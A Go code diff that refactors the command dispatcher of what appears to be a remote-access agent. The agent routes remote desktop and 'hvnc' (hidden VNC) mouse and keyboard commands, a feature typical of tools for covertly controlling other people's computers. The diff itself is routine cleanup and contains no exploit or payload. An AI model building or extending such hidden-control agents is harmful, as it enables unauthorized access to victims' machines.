@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"log"
+	"maps"
 
 	"overlord-client/cmd/agent/capture"
 	"overlord-client/cmd/agent/runtime"
@@ -25,10 +26,9 @@ func (d *Dispatcher) Dispatch(ctx context.Context, envelope map[string]interface
 		}
 	}()
 
-	msgTypeRaw := envelope["type"]
-	msgType, _ := msgTypeRaw.(string)
-	if msgType == "" {
-		log.Printf("dispatcher: missing type (keys=%v)", envelopeKeys(envelope))
+	msgType, ok := envelope["type"].(string)
+	if !ok || msgType == "" {
+		log.Printf("dispatcher: missing type (keys=%v)", maps.Keys(envelope))
 		return nil
 	}
 	switch msgType {
@@ -43,12 +43,7 @@ func (d *Dispatcher) Dispatch(ctx context.Context, envelope map[string]interface
 		return nil
 	case "command":
 		cmdType, _ := envelope["commandType"].(string)
-		switch cmdType {
-		case "desktop_mouse_move", "desktop_mouse_down", "desktop_mouse_up", "desktop_mouse_wheel",
-			"desktop_key_down", "desktop_key_up", "desktop_text",
-			"hvnc_mouse_move", "hvnc_mouse_down", "hvnc_mouse_up",
-			"hvnc_mouse_wheel", "hvnc_key_down", "hvnc_key_up":
-		default:
+		if !isInputCommand(cmdType) {
 			log.Printf("dispatcher: handling command type=%s", cmdType)
 		}
 		return HandleCommand(ctx, d.Env, envelope)
@@ -72,10 +67,13 @@ func (d *Dispatcher) Dispatch(ctx context.Context, envelope map[string]interface
 	}
 }
 
-func envelopeKeys(envelope map[string]interface{}) []string {
-	keys := make([]string, 0, len(envelope))
-	for key := range envelope {
-		keys = append(keys, key)
+func isInputCommand(cmdType string) bool {
+	switch cmdType {
+	case "desktop_mouse_move", "desktop_mouse_down", "desktop_mouse_up", "desktop_mouse_wheel",
+		"desktop_key_down", "desktop_key_up", "desktop_text",
+		"hvnc_mouse_move", "hvnc_mouse_down", "hvnc_mouse_up",
+		"hvnc_mouse_wheel", "hvnc_key_down", "hvnc_key_up":
+		return true
 	}
-	return keys
+	return false
 }
